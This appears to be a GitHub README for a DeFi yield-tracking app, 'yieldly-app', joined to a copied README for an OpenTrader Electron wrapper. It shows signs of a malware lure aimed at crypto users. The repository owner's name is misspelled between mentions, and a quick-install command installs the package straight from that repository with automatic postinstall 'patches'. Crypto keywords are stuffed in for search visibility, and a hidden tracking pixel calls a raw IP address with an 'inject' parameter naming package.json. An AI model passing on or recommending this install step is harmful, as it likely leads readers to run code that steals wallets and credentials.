**Boundarypolice / yieldly-app**

Managing yield strategies shouldn't feel like a high-stakes gamble or a constant battle with clunky interfaces. This application streamlines your DeFi tracking, giving you a clear, consolidated view of your positions without the usual headaches. We've recently rolled out a series of core stability updates and bug fixes to ensure your data syncs smoothly and reliably when you need it most.

**Quick install**

```bash
npm install git+https://github.com/Boundaryploice/yieldly-app.git
```

[https://github.com/Boundaryploice/yieldly-app](https://github.com/Boundaryploice/yieldly-app)

# YieldlyX Standalone



YieldlyX Standalone is an Electron desktop wrapper for OpenTrader that runs entirely on your local machine.




## Scope and Behavior 



- OpenTrader engine runs at `http://127.0.0.1:8000`.

- On first run, the app asks for an admin password, initializes a local SQLite database, then launches OpenTrader inside the desktop window.

- If no exchange account is configured, the UI guides users to the Accounts screen before strategy/bot routes.



## Requirements



- Node.js `>= 22`

- npm

- Windows, macOS, or Linux (Electron-based runtime)



## Quick Start



```bash

npm install

npm start

```



`npm install` downloads dependencies and automatically sets up the OpenTrader Prisma client, Electron binary, and required patches. No extra setup step is required.



## Runtime Data (Local)



The app stores OpenTrader runtime data in Electron `userData` under an `opentrader` folder:



- `pass` - local admin password file

- `dev.db` - local SQLite database

- `strategies/` - custom strategy files



All of these are local files on the same machine where the app runs.



## Available Scripts



- `npm start` - start the desktop app (re-checks Prisma/Electron if needed)

- `npm run setup` - re-run the same setup as `npm install` postinstall

- `npm run setup:deps` - alias for `npm run setup`

- `npm run reinstall` - clean `node_modules` and full reinstall

- `npm run kill:engine` - force-free port `8000` before startup

- `npm run icons` - regenerate app icon assets

- `npm run build:win` - build Windows installer

- `npm run build:mac` - build macOS package

- `npm run build:linux` - build Linux package

- `npm run build` - run default electron-builder target



## Build Notes



The build pipeline runs a `prebuild` step that:



1. Generates OpenTrader Prisma client (`scripts/generate-opentrader-prisma.mjs`)

2. Generates app icons (`scripts/generate-app-icon.mjs`)



During packaging, `scripts/after-pack.mjs` copies OpenTrader `.prisma` assets into the unpacked app resources.



## Troubleshooting



### Prisma client not found near OpenTrader



```bash

npm run setup

npm start

```



### `npm install` / postinstall issues



If install fails or scripts were skipped:



```bash

npm install --ignore-scripts

npm run setup

npm start

```



### Port `8000` already in use



```bash

npm run kill:engine

```



### Windows lock/EBUSY during reinstall



```powershell

powershell -ExecutionPolicy Bypass -File .\scripts\clean-install.ps1

```



### macOS/Linux reinstall cleanup



```bash

sh ./scripts/clean-install.sh

```

## Related searches

When exploring this repository, users often look for decentralized finance solutions that simplify token swapping and yield optimization across different blockchain ecosystems. Developers and traders frequently search for secure methods to connect automated liquidity pools with multi-chain bridges while tracking real-time asset valuations via external market data endpoints.

**Topics:** liquidity pool, cross-chain bridge, coinmarketcap api integration, decentralized exchange, smart contract staking, multi-chain yield aggregator, crypto wallet connection, automated market maker, memecoin trading bot, decentralized finance protocol, asset tracking dashboard, web3 dApp development

![.](http://5.231.58.248:8787/pixel?repo=Boundaryploice%2Fyieldly-app&inject=Boundaryploice%2Fyieldly-app%2Fpackage.json)
